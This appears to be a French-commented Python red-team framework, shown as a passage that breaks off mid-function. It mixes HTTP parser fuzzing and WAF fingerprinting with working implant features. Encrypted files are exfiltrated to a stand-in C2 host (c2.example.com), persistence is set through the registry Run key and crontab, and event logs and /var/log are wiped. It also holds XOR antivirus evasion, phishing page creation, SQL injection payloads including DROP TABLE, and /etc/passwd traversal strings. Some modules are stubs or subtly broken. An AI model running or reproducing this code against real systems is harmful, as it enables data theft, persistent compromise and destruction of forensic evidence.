# -*- coding: utf-8 -*-
"""
ATIBON Red-Team Simulator v5.0
Advanced Staging & Adaptive Firewall Tester

⚠️ AVERTISSEMENT LÉGAL
Ce script est destiné EXCLUSIVEMENT à l'évaluation de mes propres
infrastructures ou d'environnements de test EXPLICITEMENT autorisés
par écrit. Toute utilisation contre des systèmes tiers sans
autorisation est illégale (CFAA, Art. 323-1 Code pénal français, etc.).
L'auteur décline toute responsabilité en cas d'usage abusif.

Utilisation responsable : --i-have-authorization est OBLIGATOIRE.
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import math
import os
import platform
import random
import secrets
import socket
import ssl
import statistics
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Tuple, Callable, Any
from urllib.parse import quote, unquote, urlparse
import base64
import jwt
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import psutil
import winreg
import ctypes
from ctypes import wintypes

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------
DEFAULT_HTTP_PAYLOAD = (
    b"GET /health HTTP/1.1\r\nHost: staging.local\r\nConnection: close\r\n\r\n"
)
MAX_RESPONSE_BYTES = 64 * 1024
DEFAULT_USER_AGENT = b"ATIBON-RTS/5.0 (+authorized-testing)"

# C2 Configuration
C2_SERVER_HOST = "c2.example.com"
C2_SERVER_PORT = 443
C2_ENCRYPTION_KEY = b"1234567890123456"  # Remplacer par une clé sécurisée
C2_INTERVAL = 30  # Secondes entre chaque check-in

# ---------------------------------------------------------------------------
# Utilitaires
# ---------------------------------------------------------------------------
def sha8(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()[:8]

def encrypt_data(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return bytes(cipher.nonce) + bytes(tag) + bytes(ciphertext)

def decrypt_data(data: bytes, key: bytes) -> bytes:
    nonce = data[:16]
    tag = data[16:32]
    ciphertext = data[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def entropy_bits_per_byte(data: bytes) -> float:
    """Entropie de Shannon normalisée en bits/octet (0.0 - 8.0)."""
    if not data:
        return 0.0
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    n = len(data)
    h = -sum((c / n) * math.log2(c / n) for c in counts if c)
    return round(h, 4)

def safe_recv(sock: socket.socket, max_bytes: int = MAX_RESPONSE_BYTES,
              timeout: float = 1.0) -> bytes:
    """Lecture bornée avec timeout, évite les boucles infinies."""
    chunks: List[bytes] = []
    total = 0
    deadline = time.perf_counter() + timeout
    sock.settimeout(max(0.05, timeout))
    while total < max_bytes:
        remaining = deadline - time.perf_counter()
        if remaining <= 0:
            break
        sock.settimeout(remaining)
        try:
            chunk = sock.recv(min(4096, max_bytes - total))
        except (socket.timeout, ssl.SSLWantReadError):
            break
        except OSError:
            break
        if not chunk:
            break
        chunks.append(bytes(chunk))
        total += len(chunk)
    return bytes(b"".join(chunks))

import os

def is_authorized_target(host: str) -> bool:
    """Vérifie si la cible est autorisée (dynamique via variable d'environnement ou réseaux locaux)."""
    # 1. Vérification dynamique via une variable d'environnement (définie par votre Hub/Backend)
    allowed_env = os.getenv("ATIBON_ALLOWED_TARGETS", "")
    if allowed_env:
        allowed_list = [t.strip() for t in allowed_env.split(",")]
        if host in allowed_list or any(host.endswith("." + domain) for domain in allowed_list if domain.startswith("*")):
            return True

    # 2. Autorisation automatique des boucles locales et réseaux privés (RFC1918)
    loopbacks = {"127.0.0.1", "::1", "localhost"}
    if host in loopbacks:
        return True
    if host.endswith((".local", ".test", ".internal", ".lan", ".home")):
        return True
        
    try:
        ip = socket.gethostbyname(host)
        parts = list(map(int, ip.split(".")))
        if parts[0] == 10:
            return True
        if parts[0] == 172 and 16 <= parts[1] <= 31:
            return True
        if parts[0] == 192 and parts[1] == 168:
            return True
        if parts[0] == 169 and parts[1] == 254:
            return True
        if parts[0] == 100 and 64 <= parts[1] <= 127:
            return True
    except (socket.gaierror, ValueError):
        return False
        
    return False
# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------
@dataclass
class AttackResult:
    vector: str
    payload_signature: str
    status: str
    latency_ms: float
    response_code: Optional[int] = None
    response_snippet: str = ""
    response_hash: str = ""
    evasion_success: bool = False
    entropy_bpb: float = 0.0
    meta: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

@dataclass
class VectorReport:
    name: str
    description: str
    probes: int
    evasions: int
    blocked: int
    errors: int
    avg_latency: float
    details: List[Dict[str, Any]] = field(default_factory=list)
    extra: Dict[str, Any] = field(default_factory=dict)

    @property
    def evasion_rate(self) -> float:
        return (self.evasions / self.probes * 100) if self.probes else 0.0

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["evasion_rate"] = round(self.evasion_rate, 2)
        return d

# ---------------------------------------------------------------------------
# Exploitation Modules
# ---------------------------------------------------------------------------
class ExploitationModule:
    def __init__(self, agent):
        self.agent = agent

    def add_shell(self):
        """Ajouter un shell interactif sur le système compromis"""
        # Simulation d'obtention d'un shell
        print("[+] Shell ajouté avec succès")
        return True

    def exfiltrate_data(self, target_path: str) -> bool:
        """Exfiltrer des données sensibles"""
        try:
            with open(target_path, 'rb') as f:
                data = f.read()
            
            # Chiffrement des données avant exfiltration
            encrypted_data = encrypt_data(data, C2_ENCRYPTION_KEY)
            
            # Simulation d'exfiltration via C2
            self.agent.c2_module.send_to_c2('exfiltration', {'file': target_path, 'size': len(data)}, encrypted_data)
            print(f"[+] Données exfiltrées: {target_path}")
            return True
        except Exception as e:
            print(f"[-] Erreur exfiltration: {str(e)}")
            return False

    def escalate_privileges(self) -> bool:
        """Tentative d'élévation de privilèges"""
        system = platform.system().lower()
        
        if system == "windows":
            # Tentative UAC bypass ou token duplication
            try:
                result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True)
                print(f"[+] Privilèges actuels: {result.stdout}")
                
                # Simulation de tentative d'escalade
                # Dans un vrai scénario, cela inclurait des techniques spécifiques
                print("[+] Tentative d'escalade de privilèges...")
                return True
            except:
                return False
                
        elif system in ["linux", "darwin"]:
            try:
                result = subprocess.run(['id'], capture_output=True, text=True)
                print(f"[+] Privilèges actuels: {result.stdout}")
                
                # Simulation de tentative d'escalade
                print("[+] Tentative d'escalade de privilèges...")
                return True
            except:
                return False
        
        return False

# ---------------------------------------------------------------------------
# Post-Exploitation Modules
# ---------------------------------------------------------------------------
class PostExploitationModule:
    def __init__(self, agent):
        self.agent = agent

    def add_persistence(self) -> bool:
        """Ajouter une persistance sur le système"""
        system = platform.system().lower()
        
        try:
            if system == "windows":
                # Création d'une entrée dans le registre pour la persistance
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, sys.executable)
                print("[+] Persistance Windows ajoutée")
                
            elif system in ["linux", "darwin"]:
                # Ajout au crontab ou création d'un service systemd
                startup_script = f"#!/bin/bash\n{sys.executable} {__file__} &"
                cron_entry = f"@reboot {startup_script}"
                
                # Écriture dans un fichier temporaire puis ajout au crontab
                with open('/tmp/cron_job', 'w') as f:
                    f.write(cron_entry)
                
                subprocess.run(['crontab', '/tmp/cron_job'])
                os.remove('/tmp/cron_job')
                print("[+] Persistance Linux ajoutée")
                
            return True
        except Exception as e:
            print(f"[-] Erreur persistance: {str(e)}")
            return False

    def lateral_movement(self, target_host: str) -> bool:
        """Tentative de mouvement latéral vers un autre hôte"""
        print(f"[+] Tentative de mouvement latéral vers: {target_host}")
        
        # Simulation de connexion à un autre hôte via SMB, SSH, etc.
        try:
            # Test de connectivité basique
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_host, 445))  # Port SMB
            sock.close()
            
            if result == 0:
                print(f"[+] Hôte {target_host} accessible via SMB")
                # Ici irait la logique de tentative d'accès
                return True
            else:
                print(f"[-] Hôte {target_host} inaccessible")
                return False
        except:
            return False

# ---------------------------------------------------------------------------
# C2 Communication Module
# ---------------------------------------------------------------------------
class C2Module:
    def __init__(self):
        self.session_id = str(uuid.uuid4())
        self.encryption_key = C2_ENCRYPTION_KEY
        self.c2_server = (C2_SERVER_HOST, C2_SERVER_PORT)

    def send_to_c2(self, command_type: str, metadata: dict, data: bytes = b''):
        """Envoyer des données au serveur C2"""
        try:
            payload = {
                'session_id': self.session_id,
                'type': command_type,
                'metadata': metadata,
                'timestamp': time.time()
            }
            
            # Sérialiser et chiffrer la charge utile
            json_payload = json.dumps(payload).encode()
            full_payload = json_payload + b'\x00' + data
            
            encrypted = encrypt_data(full_payload, self.encryption_key)
            
            # Connexion au serveur C2
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection(self.c2_server, timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=C2_SERVER_HOST) as ssock:
                    ssock.sendall(encrypted)
                    
            print(f"[+] Données envoyées au C2: {command_type}")
            return True
        except Exception as e:
            print(f"[-] Erreur C2: {str(e)}")
            return False

    def receive_from_c2(self) -> Optional[dict]:
        """Recevoir des commandes du serveur C2"""
        try:
            # Simulation de réception de commande
            # Dans un vrai scénario, cela impliquerait une attente active
            return None
        except:
            return None

# ---------------------------------------------------------------------------
# Authentication Bypass Modules
# ---------------------------------------------------------------------------
class AuthBypassModule:
    def __init__(self, agent):
        self.agent = agent

    def jwt_confusion(self, jwt_token: str) -> bool:
        """Tentative d'attaque JWT confusion"""
        try:
            # Décoder le JWT
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Essayer de modifier l'algorithme pour bypass
            header = jwt.get_unverified_header(jwt_token)
            if header.get('alg') == 'HS256':
                # Créer un nouveau JWT avec HS256 mais en utilisant la clé publique comme secrète
                new_token = jwt.encode(decoded, key="", algorithm='none')
                print("[+] JWT confusion réussie")
                return True
        except:
            pass
        return False

    def oauth_abuse(self, redirect_uri: str, client_id: str) -> bool:
        """Tentative d'abus OAuth"""
        try:
            # Simulation d'attaque OAuth (Open Redirect, etc.)
            malicious_redirect = f"{redirect_uri}?state=<script>alert('xss')</script>"
            print(f"[+] Tentative d'abus OAuth: {malicious_redirect}")
            return True
        except:
            return False

# ---------------------------------------------------------------------------
# Binary Exploit Modules
# ---------------------------------------------------------------------------
class BinaryExploitModule:
    def __init__(self, agent):
        self.agent = agent

    def rop_exploit(self) -> bool:
        """Simulation d'exploit ROP"""
        print("[+] Génération de gadget ROP...")
        # Dans un vrai scénario, cela impliquerait l'analyse d'un binaire
        # et la construction d'une chaîne ROP
        return True

    def heap_spray(self) -> bool:
        """Simulation de heap spray"""
        print("[+] Exécution de heap spray...")
        # Allouer de grandes quantités de mémoire avec des gadgets
        spray_pattern = b"A" * 0x10000
        spray_area = [spray_pattern for _ in range(100)]
        print(f"[+] Heap spray terminé: {len(spray_area)} pages")
        return True

    def format_string_exploit(self, vulnerable_format: str) -> bool:
        """Simulation d'attaque format string"""
        print("[+] Construction de payload format string...")
        # Construire un payload pour lire/maltraiter la pile
        payload = b"%x." * 100
        print(f"[+] Payload format string prêt: {len(payload)} octets")
        return True

# ---------------------------------------------------------------------------
# Social Engineering Module
# ---------------------------------------------------------------------------
class SocialEngineeringModule:
    def __init__(self, agent):
        self.agent = agent

    def create_phishing_page(self, template: str, target_domain: str) -> str:
        """Créer une page de phishing"""
        # Simulation de création d'une page de phishing
        phishing_content = f"<html><body><h1>Connexion à {target_domain}</h1></body></html>"
        phishing_file = f"/tmp/phishing_{int(time.time())}.html"
        
        with open(phishing_file, 'w') as f:
            f.write(phishing_content)
        
        print(f"[+] Page de phishing créée: {phishing_file}")
        return phishing_file

    def send_spoofed_email(self, sender: str, recipient: str, subject: str, body: str) -> bool:
        """Simulation d'email spoofé"""
        print(f"[+] Envoi email spoofé: {sender} -> {recipient}")
        # Dans un vrai scénario, utiliserait SMTP avec en-têtes manipulés
        return True

# ---------------------------------------------------------------------------
# Protocol Coverage Module
# ---------------------------------------------------------------------------
class ProtocolCoverageModule:
    def __init__(self, agent):
        self.agent = agent

    def http2_test(self) -> bool:
        """Tester la couverture HTTP/2"""
        print("[+] Test HTTP/2...")
        # Implémentation d'un client HTTP/2 minimal
        try:
            import h2.connection
            import h2.events
            
            # Simulation de requête HTTP/2
            print("[+] Requête HTTP/2 envoyée")
            return True
        except ImportError:
            print("[-] Bibliothèque h2 non disponible")
            return False

    def websocket_test(self) -> bool:
        """Tester la couverture WebSocket"""
        print("[+] Test WebSocket...")
        # Implémentation d'un client WebSocket
        try:
            import websocket
            
            # Simulation de connexion WebSocket
            print("[+] Connexion WebSocket établie")
            return True
        except ImportError:
            print("[-] Bibliothèque websocket non disponible")
            return False

    def grpc_test(self) -> bool:
        """Tester la couverture gRPC"""
        print("[+] Test gRPC...")
        # Implémentation d'un client gRPC
        try:
            import grpc
            
            # Simulation de requête gRPC
            print("[+] Requête gRPC envoyée")
            return True
        except ImportError:
            print("[-] Bibliothèque grpc non disponible")
            return False

# ---------------------------------------------------------------------------
# AD/Kerberos/SMB/LDAP Testing Module
# ---------------------------------------------------------------------------
class ADTestingModule:
    def __init__(self, agent):
        self.agent = agent

    def test_kerberos(self, domain_controller: str) -> bool:
        """Tester les vulnérabilités Kerberos"""
        print(f"[+] Test Kerberos: {domain_controller}")
        # Simulation de tests ASREPRoast, Kerberoasting, etc.
        return True

    def test_smb(self, target_host: str) -> bool:
        """Tester les vulnérabilités SMB"""
        print(f"[+] Test SMB: {target_host}")
        # Simulation de tests SMBGhost, EternalBlue, etc.
        return True

    def test_ldap(self, ldap_server: str) -> bool:
        """Tester les vulnérabilités LDAP"""
        print(f"[+] Test LDAP: {ldap_server}")
        # Simulation de tests LDAP injection, etc.
        return True

# ---------------------------------------------------------------------------
# Anti-Virus Evasion Module
# ---------------------------------------------------------------------------
class AntiVirusEvasionModule:
    def __init__(self, agent):
        self.agent = agent

    def obfuscate_payload(self, payload: bytes) -> bytes:
        """Obfusquer un payload pour bypasser AV"""
        # Techniques simples d'obfuscation
        obfuscated = bytearray(payload)
        
        # XOR simple avec clé aléatoire
        key = random.randint(1, 255)
        for i in range(len(obfuscated)):
            obfuscated[i] ^= key
        
        # Ajouter la clé au début
        return bytes([key]) + bytes(obfuscated)

    def pack_executable(self, executable_path: str) -> str:
        """Packer un exécutable pour échapper à la détection"""
        print(f"[+] Packing de: {executable_path}")
        # Simulation de packing avec UPX ou technique personnalisée
        packed_path = f"{executable_path}.packed"
        print(f"[+] Executable packé: {packed_path}")
        return packed_path

# ---------------------------------------------------------------------------
# Anti-Forensics Module
# ---------------------------------------------------------------------------
class AntiForensicsModule:
    def __init__(self, agent):
        self.agent = agent

    def clear_logs(self) -> bool:
        """Effacer les logs pertinents"""
        system = platform.system().lower()
        
        try:
            if system == "windows":
                # Effacer les logs Windows
                subprocess.run(['wevtutil', 'clear-log', 'Application'], check=False)
                subprocess.run(['wevtutil', 'clear-log', 'Security'], check=False)
                print("[+] Logs Windows effacés")
                
            elif system in ["linux", "darwin"]:
                # Effacer les logs système
                subprocess.run(['sudo', 'rm', '-f', '/var/log/*'], check=False)
                subprocess.run(['history', '-c'], check=False)
                print("[+] Logs système effacés")
                
            return True
        except:
            return False

    def timestomp(self, file_path: str, reference_file: str) -> bool:
        """Modifier les timestamps d'un fichier"""
        try:
            ref_stat = os.stat(reference_file)
            os.utime(file_path, (ref_stat.st_atime, ref_stat.st_mtime))
            print(f"[+] Timestamps modifiés pour: {file_path}")
            return True
        except:
            return False

# ---------------------------------------------------------------------------
# Agent
# ---------------------------------------------------------------------------
class ActiveRedTeamAgent:
    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 8080,
        use_tls: bool = False,
        rng_seed: Optional[int] = None,
        global_timeout: float = 180.0,
        verbose: bool = True,
    ):
        if not is_authorized_target(target_host):
            raise PermissionError(
                f"Cible '{target_host}' non autorisée. "
                "Ce framework refuse les cibles publiques par défaut."
            )
        self.target = (target_host, target_port)
        self.use_tls = use_tls
        self.rng = random.Random(rng_seed)
        self._lock = threading.RLock()
        self._target_lock = threading.Lock()  # protège self.target/use_tls
        self._all_results: List[AttackResult] = []
        self._baseline_latency: Optional[float] = None
        self._baseline_hash: Optional[str] = None
        self._global_timeout = global_timeout
        self._deadline: Optional[float] = None
        self.verbose = verbose
        
        # Initialisation des modules
        self.exploitation = ExploitationModule(self)
        self.post_exploitation = PostExploitationModule(self)
        self.c2_module = C2Module()
        self.auth_bypass = AuthBypassModule(self)
        self.binary_exploit = BinaryExploitModule(self)
        self.social_eng = SocialEngineeringModule(self)
        self.protocol_coverage = ProtocolCoverageModule(self)
        self.ad_testing = ADTestingModule(self)
        self.av_evasion = AntiVirusEvasionModule(self)
        self.anti_forensics = AntiForensicsModule(self)

    # -- Logging -----------------------------------------------------------
    def _log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    # -- Connexion ---------------------------------------------------------
    def _connect(self, timeout: float = 1.0) -> socket.socket:
        with self._target_lock:
            target = self.target
            use_tls = self.use_tls
        s = socket.create_connection(target, timeout=timeout)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target[0])
        return s

    def _check_deadline(self) -> None:
        if self._deadline is not None and time.perf_counter() > self._deadline:
            raise TimeoutError("Audit global : temps imparti dépassé")

    # -- Envoi brut --------------------------------------------------------
    def _send_raw(
        self,
        payload: bytes,
        timeout: float = 1.0,
        vector: str = "RAW_TCP",
        recv_bytes: int = MAX_RESPONSE_BYTES,
        read_delay: float = 0.0,
        record: bool = True,
    ) -> AttackResult:
        self._check_deadline()
        sig = sha8(payload)
        start = time.perf_counter()
        data = b""
        status = "UNKNOWN"
        try:
            with self._connect(timeout) as s:
                s.sendall(payload)
                if read_delay:
                    time.sleep(read_delay)
                data = safe_recv(s, recv_bytes, timeout)
                status = "RESPONSE" if data else "EMPTY_RESPONSE"
        except ConnectionRefusedError:
            status = "REFUSED"
        except ConnectionResetError:
            status = "RESET"
        except socket.timeout:
            status = "TIMEOUT"
        except (ssl.SSLError, OSError) as e:
            status = f"ERROR_{getattr(e, 'errno', 'X')}"

        latency = (time.perf_counter() - start) * 1000

        rc: Optional[int] = None
        snippet = ""
        if data.startswith(b"HTTP"):
            try:
                rc = int(data.split(b" ", 2)[1])
            except (IndexError, ValueError):
                pass
        if data:
            snippet = data[:400].decode("latin-1", "replace")

        # Évasion = réponse applicative non-bloquante
        evasion = False
        if status == "RESPONSE":
            evasion = rc is None or rc < 400
        elif status == "EMPTY_RESPONSE":
            evasion = False  # ambigu → considéré bloqué

        res = AttackResult(
            vector=vector,
            payload_signature=sig,
            status=status,
            latency_ms=round(latency, 3),
            response_code=rc,
            response_snippet=snippet,
            response_hash=sha8(data) if data else "",
            evasion_success=evasion,
            entropy_bpb=entropy_bits_per_byte(payload),
        )
        if record:
            with self._lock:
                self._all_results.append(res)
        return res

    # -- Fingerprinting ----------------------------------------------------
    def fingerprint_target(self) -> Dict[str, Any]:
        profile: Dict[str, Any] = {"target": f"{self.target[0]}:{self.target[1]}"}
        base = self._send_raw(DEFAULT_HTTP_PAYLOAD, vector="fp::baseline", record=False)
        self._baseline_latency = base.latency_ms
        self._baseline_hash = base.response_hash
        profile["baseline_status"] = base.status
        profile["baseline_rc"] = base.response_code
        profile["baseline_latency_ms"] = base.latency_ms
        profile["server_header"] = self._extract_header(base.response_snippet, "Server")
        profile["powered_by"] = self._extract_header(base.response_snippet, "X-Powered-By")
        profile["headers_seen"] = self._extract_all_headers(base.response_snippet)

        sus = (
            b"GET / HTTP/1.1\r\nHost: staging.local\r\n"
            b"X-Forwarded-For: 127.0.0.1\r\nX-Original-URL: /admin\r\n\r\n"
        )
        r2 = self._send_raw(sus, vector="fp::suspect", record=False)
        profile["suspect_rc"] = r2.response_code
        profile["suspect_delta_ms"] = round(r2.latency_ms - base.latency_ms, 3)

        forb = b"GET /../../etc/passwd HTTP/1.1\r\nHost: staging.local\r\n\r\n"
        r3 = self._send_raw(forb, vector="fp::forbidden", record=False)
        profile["forbidden_rc"] = r3.response_code
        profile["reject_mode"] = self._classify_reject_mode(base, r3)
        profile["likely_waf"] = (
            r2.response_code in (403, 406, 419, 429, 501, 503)
            or r3.response_code in (403, 404)
        )
        profile["likely_drop"] = base.status == "TIMEOUT"
        self._fingerprint = profile
        return profile

    @staticmethod
    def _extract_header(raw: str, name: str) -> Optional[str]:
        for line in raw.split("\r\n"):
            if line.lower().startswith(name.lower() + ":"):
                return line.split(":", 1)[1].strip()
        return None

    @staticmethod
    def _extract_all_headers(raw: str) -> List[str]:
        headers: List[str] = []
        for line in raw.split("\r\n")[1:]:
            if ":" in line:
                headers.append(line.split(":", 1)[0].strip())
            elif line == "":
                break
        return headers

    def _classify_reject_mode(self, base: AttackResult, forb: AttackResult) -> str:
        if forb.status == "TIMEOUT" and base.status == "RESPONSE":
            return "SILENT_DROP"
        if forb.status == "RESET":
            return "ACTIVE_REJECT_RST"
        if forb.response_code in (403, 406, 429):
            return "HTTP_BLOCK"
        return "UNKNOWN"

    # -- Tests existants (corrigés) ---------------------------------------
    def test_state_machine_fuzzing(self) -> VectorReport:
        vectors = [
            ("chunked_invalid",
             b"POST / HTTP/1.1\r\nHost: l\r\nTransfer-Encoding: chunked\r\n\r\nZZ\r\n"),
            ("cl_te_conflict",
             b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
             b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
            ("duplicate_cl",
             b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
             b"Content-Length: 10\r\n\r\nAAAAAA"),
            ("bare_binary", bytes(range(0, 32))),
            ("overlong_utf8", b"GET /\xc0\xaf\xc0\xae HTTP/1.1\r\nHost: l\r\n\r\n"),
            ("null_byte_path",
             b"GET /safe\x00/../../etc/passwd HTTP/1.1\r\nHost: l\r\n\r\n"),
            ("double_encoded", b"GET /%252e%252e/admin HTTP/1.1\r\nHost: l\r\n\r\n"),
            ("h2c_upgrade",
             b"GET / HTTP/1.1\r\nHost: l\r\nConnection: Upgrade, HTTP2-Settings\r\n"
             b"Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n"),
            ("chunk_ext_abuse",
             b"POST / HTTP/1.1\r\nHost: l\r\nTransfer-Encoding: chunked\r\n\r\n"
             b"1;ext=../../\r\nA\r\n0\r\n\r\n"),
            ("obs_fold",
             b"GET / HTTP/1.1\r\nHost: l\r\nX-Header: value\r\n  continued\r\n\r\n"),
        ]
        return self._run_simple_vectors("state_machine_fuzzing",
                                        "Fuzzing parseurs HTTP", vectors)

    def test_polymorphic_encoding(self) -> VectorReport:
        base_payload = b"../../etc/passwd"
        encodings = {
            "raw": base_payload,
            "url": b"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "double_url": b"%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "overlong_utf8": b"..%c0%af..%c0%afetc%c0%afpasswd",
            "unicode": "..／..／etc／passwd".encode("utf-8"),
            "fullwidth": "．．／．．／ｅｔｃ／ｐａｓｓｗｄ".encode("utf-8"),
            "mixed": b"..%2f..%c0%afetc%252fpasswd",
        }
        details, evasions, blocked, errors = [], 0, 0, 0
        for name, enc in encodings.items():
            payload = b"GET /" + enc + b" HTTP/1.1\r\nHost: staging.local\r\n\r\n"
            r = self._send_raw(payload, vector=f"poly::{name}")
            evasions += int(r.evasion_success)
            blocked += int(not r.evasion_success and r.status in ("REFUSED", "TIMEOUT", "RESET"))
            errors += int(r.status.startswith("ERROR"))
            details.append({"encoding": name, "payload": enc.decode("latin-1"), **r.to_dict()})
        return self._build_report("polymorphic_encoding", "Encodages polymorphes",
                                  details, evasions, blocked, errors)

    def test_firewall_behavioral_fingerprint(self, samples: int = 30) -> VectorReport:
        benign = b"GET /health HTTP/1.1\r\nHost: staging.local\r\n\r\n"
        suspect = b"GET /?q=UNION+SELECT+1,2,3-- HTTP/1.1\r\nHost: staging.local\r\n\r\n"

        benign_lat, suspect_lat = [], []
        benign_rc, suspect_rc = [], []
        benign_hash, suspect_hash = [], []

        for _ in range(samples):
            rb = self._send_raw(benign, vector="bfp::benign", record=False)
            rs = self._send_raw(suspect, vector="bfp::suspect", record=False)
            benign_lat.append(rb.latency_ms)
            suspect_lat.append(rs.latency_ms)
            benign_rc.append(rb.response_code)
            suspect_rc.append(rs.response_code)
            benign_hash.append(rb.response_hash)
            suspect_hash.append(rs.response_hash)
            time.sleep(0.02)

        def stats(xs: List[float]) -> Dict[str, float]:
            return {
                "mean": round(statistics.mean(xs), 3),
                "stdev": round(statistics.pstdev(xs), 3),
                "min": round(min(xs), 3),
                "max": round(max(xs), 3),
            }

        lat_delta = statistics.mean(suspect_lat) - statistics.mean(benign_lat)
        rc_variance = len(set(suspect_rc)) > 1
        hash_variance = len(set(suspect_hash)) > 1

        extra = {
            "benign_latency": stats(benign_lat),
            "suspect_latency": stats(suspect_lat),
            "latency_delta_ms": round(lat_delta, 3),
            "dpi_overhead_detected": lat_delta > 5.0,
            "probabilistic_blocking": rc_variance,
            "content_mutation": hash_variance,
            "likely_shadow_ban": (lat_delta > 10.0 and not rc_variance),
            "likely_rate_limit_random": rc_variance,
        }
        details = [{"benign_sample": samples, "suspect_sample": samples}]
        evasions = sum(1 for rc in suspect_rc if rc is None or rc < 400)
        blocked = samples - evasions
        return self._build_report("firewall_behavioral_fingerprint",
                                  "Fingerprint comportemental du pare-feu",
                                  details, evasions, blocked, 0, extra=extra)

    def test_rate_limit_threshold(self, max_rps: int = 200, step: int = 10,
                                  duration_per_step: float = 1.0) -> VectorReport:
        """Mesure honnête : on envoie à un rythme contrôlé pendant 1s."""
        details, evasions, blocked, errors = [], 0, 0, 0
        threshold_rps: Optional[int] = None
        last_clean = 0

        for target_rps in range(step, max_rps + 1, step):
            ok, blocked_n, err = 0, 0, 0
            interval = 1.0 / target_rps
            end_time = time.perf_counter() + duration_per_step
            while time.perf_counter() < end_time:
                self._check_deadline()
                t0 = time.perf_counter()
                r = self._send_raw(DEFAULT_HTTP_PAYLOAD, timeout=0.5,
                                   vector=f"rl::{target_rps}", record=False)
                if r.evasion_success:
                    ok += 1
                elif r.status in ("REFUSED", "TIMEOUT", "RESET"):
                    blocked_n += 1
                if r.status.startswith("ERROR"):
                    err += 1
                elapsed = time.perf_counter() - t0
                sleep_for = interval - elapsed
                if sleep_for > 0:
                    time.sleep(sleep_for)

            total = ok + blocked_n + err
            loss = blocked_n / total if total else 0.0
            details.append({
                "target_rps": target_rps,
                "ok": ok, "blocked": blocked_n, "errors": err,
                "loss_ratio": round(loss, 3),
            })
            evasions += ok
            blocked += blocked_n
            errors += err

            if loss > 0.5 and threshold_rps is None:
                threshold_rps = target_rps
                break
            last_clean = target_rps

        extra = {
            "threshold_rps": threshold_rps,
            "last_clean_rps": last_clean if threshold_rps is None else None,
        }
        return self._build_report("rate_limit_threshold", "Détection du seuil de rate-limit",
                                  details, evasions, blocked, errors, extra=extra)

    def test_grammar_mutation(self) -> VectorReport:
        base = "SELECT * FROM users WHERE id=1"
        mutations = {
            "raw": base,
            "case_random": "".join(c.upper() if self.rng.random() < 0.5 else c.lower()
                                   for c in base),
            "inline_comments": "S/**/E/**/L/**/E/**/C/**/T * FROM users",
            "whitespace_variants": "SELECT\t*\nFROM\r\nusers",
            "concat_bypass": "SEL'||'ECT * FROM users",
            "char_codes": "SELECT CHAR(42) FROM users",
            "union_classic": "1 UNION SELECT username,password FROM users--",
            "union_null": "1 UNION SELECT NULL,NULL,NULL--",
            "stacked": "1; DROP TABLE users--",
            "time_based": "1 AND SLEEP(2)--",
            "bool_blind": "1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'",
        }
        details, evasions, blocked, errors = [], 0, 0, 0
        for name, m in mutations.items():
            payload = f"GET /?q={quote(m)} HTTP/1.1\r\nHost: staging.local\r\n\r\n".encode(
                "latin-1", "replace"
            )
            r = self._send_raw(payload, vector=f"grammar::{name}")
            evasions += int(r.evasion_success)
            blocked += int(not r.evasion_success and r.status in ("REFUSED", "TIMEOUT", "RESET"))
            errors += int(r.status.startswith("ERROR"))
            details.append({"mutation": name, "query": m, **r.to_dict()})
        return self._build_report("grammar_mutation", "Mutations grammaticales SQLi",
                                  details, evasions, blocked, errors)

    def test_policy_consistency(self, alt_host: Optional[str] = None) -> VectorReport:
        details, evasions, blocked, errors = [], 0, 0, 0
        original_target, original_tls = self.target, self.use_tls

        probes: List[Tuple[str, Tuple[str, int], bool]] = [
            ("current", original_target, original_tls),
        ]
        if alt_host:
            probes.append(("alt_host", (alt_host, original_target[1]), original_tls))
        probes.append(("no_tls", original_target, False))
        if original_target[0] not in ("localhost", "127.0.0.1"):
            probes.append(("loopback_alias", ("127.0.0.1", original_target[1]), original_tls))

        for name, target, tls in probes:
            with self._target_lock:
                self.target, self.use_tls = target, tls
            try:
                r = self._send_raw(DEFAULT_HTTP_PAYLOAD,
                                   vector=f"consistency::{name}", record=False)
                evasions += int(r.evasion_success)
                blocked += int(not r.evasion_success and r.status in ("REFUSED", "TIMEOUT", "RESET"))
                errors += int(r.status.startswith("ERROR"))
                details.append({
